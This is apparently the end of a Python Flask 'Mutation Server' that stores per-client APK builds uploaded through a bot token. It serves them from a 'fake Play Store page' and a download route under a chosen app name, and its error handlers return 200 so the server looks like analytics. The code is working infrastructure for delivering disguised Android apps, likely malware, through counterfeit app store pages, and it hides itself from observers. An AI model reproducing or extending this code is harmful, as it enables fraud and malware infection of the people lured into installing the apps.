    auth = request.headers.get("X-Bot-Token", "")
    if auth != BOT_TOKEN:
        log.warning(f"upload_apk: bad auth token")
        abort(403)

    data = request.get_json(silent=True) or {}
    chat_id      = str(data.get("chat_id", "")).strip()
    build_number = str(data.get("build_number", "")).strip()
    filename     = str(data.get("filename", "app.apk")).strip()
    apk_b64      = data.get("apk_b64", "")

    if not chat_id or not build_number or not apk_b64:
        return jsonify({"ok": False, "error": "chat_id, build_number and apk_b64 required"}), 400

    # Sanitise inputs — no path traversal
    safe_chat    = "".join(c for c in chat_id      if c.isalnum() or c in "-_")
    safe_build   = "".join(c for c in build_number if c.isalnum() or c in "-_")
    safe_name    = "".join(c for c in filename      if c.isalnum() or c in "-_.")
    if not safe_name.endswith(".apk"):
        safe_name = "app.apk"

    dest_dir = os.path.join(ARTIFACTS_DIR, f"client_{safe_chat}", f"build_{safe_build}")
    os.makedirs(dest_dir, exist_ok=True)
    dest_path = os.path.join(dest_dir, safe_name)

    try:
        apk_bytes = base64.b64decode(apk_b64)
        with open(dest_path, "wb") as f:
            f.write(apk_bytes)
        size_mb = len(apk_bytes) / (1024 * 1024)
        log.info(f"upload_apk: saved chat={chat_id} build={build_number} file={safe_name} size={size_mb:.1f}MB → {dest_path}")
        return jsonify({"ok": True, "saved": dest_path, "size_bytes": len(apk_bytes)}), 200
    except Exception as e:
        log.error(f"upload_apk error: {e}")
        return jsonify({"ok": False, "error": str(e)}), 500


def _cleanup_old_artifacts():
    """Delete artifact build folders older than 7 days. Runs in background thread."""
    import shutil
    max_age = 7 * 24 * 3600  # 7 days in seconds
    while True:
        try:
            now = time.time()
            if os.path.isdir(ARTIFACTS_DIR):
                for client_dir in os.listdir(ARTIFACTS_DIR):
                    client_path = os.path.join(ARTIFACTS_DIR, client_dir)
                    if not os.path.isdir(client_path):
                        continue
                    for build_dir in os.listdir(client_path):
                        build_path = os.path.join(client_path, build_dir)
                        if not os.path.isdir(build_path):
                            continue
                        age = now - os.path.getmtime(build_path)
                        if age > max_age:
                            shutil.rmtree(build_path, ignore_errors=True)
                            log.info(f"cleanup: removed old build dir {build_path} (age={age/3600:.1f}h)")
        except Exception as e:
            log.error(f"cleanup_old_artifacts error: {e}")
        time.sleep(3600)  # check every hour


@app.route("/store/<token>", methods=["GET"])
def store_page(token):
    """Serve fake Play Store page for a build."""
    build = _get_build_by_token(token)
    if not build:
        return Response("Not found", status=404)
    html = _store_html(build)
    return Response(html, mimetype="text/html")


@app.route("/store/icon/<token>", methods=["GET"])
def store_icon(token):
    """Serve template icon PNG for a build."""
    build = _get_build_by_token(token)
    if not build:
        return Response("", status=404)
    template = build.get("template", "custom") or "custom"
    icon_path = os.path.join(ICON_DIR, f"{template}.png")
    if os.path.exists(icon_path):
        return send_file(icon_path, mimetype="image/png")
    return Response("", status=404)


@app.route("/dl/<token>", methods=["GET"])
def dl_apk(token):
    """Serve APK download for a build."""
    build = _get_build_by_token(token)
    if not build:
        return Response("Not found", status=404)

    # Locate APK — stored in artifacts dir or standard path
    chat_id      = build.get("chat_id", "")
    build_number = build.get("build_number", "")
    pkg          = build.get("package_name", "") or "app"
    template     = build.get("template", "custom") or "custom"
    custom_name  = build.get("custom_app_name", "") or ""
    app_name     = custom_name or (STORE_TEMPLATES.get(template, STORE_TEMPLATES["custom"])[1])

    # Locate APK in client-isolated folder: artifacts/client_<chat_id>/build_<build_number>/
    safe_chat  = "".join(c for c in str(chat_id)      if c.isalnum() or c in "-_")
    safe_build = "".join(c for c in str(build_number) if c.isalnum() or c in "-_")
    build_dir  = os.path.join(ARTIFACTS_DIR, f"client_{safe_chat}", f"build_{safe_build}")

    apk_path = None
    if os.path.isdir(build_dir):
        for fname in os.listdir(build_dir):
            if fname.endswith(".apk"):
                apk_path = os.path.join(build_dir, fname)
                break

    if not apk_path or not os.path.exists(apk_path):
        log.warning(f"dl_apk: APK not found for token={token} chat={chat_id} build={build_number} dir={build_dir}")
        return Response("APK not available", status=404)

    dl_name = f"{app_name.replace(' ', '_')}.apk"
    return send_file(apk_path, as_attachment=True, download_name=dl_name, mimetype="application/vnd.android.package-archive")


# ── Error handlers ────────────────────────────────────────────────────────────
@app.errorhandler(404)
def not_found(e):
    return jsonify({"status": 0}), 200  # Always 200 to look like analytics

@app.errorhandler(500)
def server_error(e):
    return jsonify({"status": 0}), 200


# ── Main ──────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    log.info("="*60)
    log.info("Mutation Server starting...")
    log.info(f"Port: {PORT}")
    log.info(f"DB: {DB_PATH}")
    log.info("="*60)
    init_db()
    # Start 7-day artifact cleanup background thread
    t = threading.Thread(target=_cleanup_old_artifacts, daemon=True, name="artifact-cleanup")
    t.start()
    log.info("Artifact cleanup thread started (7-day TTL)")
    app.run(
        host="0.0.0.0",
        port=PORT,
        debug=False,
        threaded=True,
        use_reloader=False
    )
